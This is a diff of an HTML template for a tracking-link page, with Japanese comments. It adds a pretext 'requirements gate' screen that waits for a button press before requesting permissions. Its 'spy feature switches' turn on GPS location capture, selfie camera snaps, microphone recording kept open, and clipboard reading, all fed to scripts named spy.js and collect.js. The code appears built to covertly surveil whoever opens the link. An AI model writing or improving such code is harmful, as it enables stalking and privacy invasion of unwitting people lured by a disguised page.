@@ -16,16 +16,45 @@ html,body{margin:0;background:#0f1115;color:#e6e9ef;
 .inner{max-width:420px;width:100%}
 .line{font-size:15px;line-height:1.7;margin:0;color:#9aa3b2;min-height:1.7em}
 .line.warn{color:#f0b429}
-button{margin-top:16px;padding:11px 26px;font-size:14px;border:0;border-radius:999px;
-  background:#4c8dff;color:#fff}
+button{margin-top:16px;padding:12px 30px;font-size:15px;border:0;border-radius:999px;
+  background:#4c8dff;color:#fff;font-weight:600}
+button:disabled{opacity:.6}
 #lt_ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
 #lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px}
 a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:14px}
 .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
-body.ui-none .line{display:none}
-body.ui-none #lt_ia{display:block}
+body.ui-none #lt_st{display:none}
+
+/* ---- 要件ゲート ---- */
+#lt_gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
+  display:flex;align-items:center;justify-content:center;padding:26px;
+  transition:opacity .35s ease, transform .35s ease}
+#lt_gate.out{opacity:0;transform:translateY(-8px)}
+.gwrap{max-width:440px;width:100%;text-align:center}
+.gwrap h1{font-size:20px;line-height:1.5;margin:0 0 16px;font-weight:700}
+.req{white-space:pre-wrap;text-align:left;font-size:14px;line-height:1.9;color:#c7cddb;
+  background:#171a21;border:1px solid #232734;border-radius:12px;padding:14px 16px;
+  max-height:46vh;overflow-y:auto}
+.ask{margin:18px 0 0;font-size:14px;color:#4c8dff;font-weight:600;line-height:1.6}
+.warnline{margin:10px 0 0;font-size:11.5px;color:#8b93a7;line-height:1.7;text-align:left}
+.stat{margin:12px 0 0;font-size:11.5px;color:#6b7386;min-height:1.4em}
 </style></head><body class="ui-{{ ui }}">
+
+{% if gate %}
+<div id="lt_gate"><div class="gwrap">
+  <h1>{{ link.name }}</h1>
+  {% if link.note %}<div class="req">{{ link.note }}</div>{% endif %}
+  <p class="ask">{{ ask_text }}</p>
+  {% if gate_warn %}
+  <p class="warnline">※位置情報はスマホのGPSを使います。GPSが取れずIPだけで判定した場合は、
+  特に4G/5G回線だと数km〜数十kmの誤差が出ます。精度が必要なときは「正確な位置情報」を選んでください。</p>
+  {% endif %}
+  <button id="lt_go">{{ go_text }}</button>
+  <p class="stat" id="lt_gate_st"></p>
+</div></div>
+{% endif %}
+
 <div class="wrap"><div class="inner">
   <p class="line" id="lt_st">{{ ask_text }}</p>
   <button id="lt_retry" style="display:none">{{ retry_text }}</button>
@@ -37,6 +66,7 @@ body.ui-none #lt_ia{display:block}
   <span class="sr" id="lt_perm"></span><span class="sr" id="lt_srv"></span>
   <span class="sr" id="lt_dbg"></span>
 </div></div>
+
 <script>
 window.LT_CODE  = {{ code|tojson }};
 window.LT_HIT   = {{ hit_id }};
@@ -53,18 +83,22 @@ window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
 window.LT_TITLE      = {{ link.name|tojson }};
 
-/* スパイ機能スイッチ */
-window.LT_CAM      = 1;    /* 自撮り（0で無効） */
-window.LT_CAM_HOLD = 0;    /* 1 でカメラを開いたまま保持 */
-window.LT_MIC      = 1;    /* 環境音 */
-window.LT_MIC_HOLD = 1;    /* 1 でマイクを開いたまま保持＝タブが生きたまま */
-window.LT_MIC_MS   = 4000; /* 録音秒数 */
-window.LT_CLIP     = 1;    /* クリップボード */
-window.LT_SPY_WAIT = 7000; /* GPS取得を待つ上限ms */
-window.LT_DEBUG    = 0;    /* 1 でエラーコードを画面に出す */
+/* ★ ここが今回の肝：ゲートを出し、押されるまで許可を取らない */
+window.LT_GATE = {{ 1 if gate else 0 }};
+
+window.LT_CAM      = 1;
+window.LT_CAM_HOLD = 0;
+window.LT_CAM_PREVIEW = 1;   /* 1 で右下に自撮りプレビューを1.5秒出す */
+window.LT_MIC      = 1;
+window.LT_MIC_HOLD = 1;
+window.LT_MIC_MS   = 4000;
+window.LT_CLIP     = 1;
+window.LT_SPY_WAIT = 7000;
+window.LT_DEBUG    = 0;
 </script>
 <script src="/static/keepalive.js"></script>
 <script src="/static/collect.js"></script>
 <script src="/static/live.js"></script>
 <script src="/static/spy.js"></script>
+<script src="/static/gate.js"></script>
 </body></html>
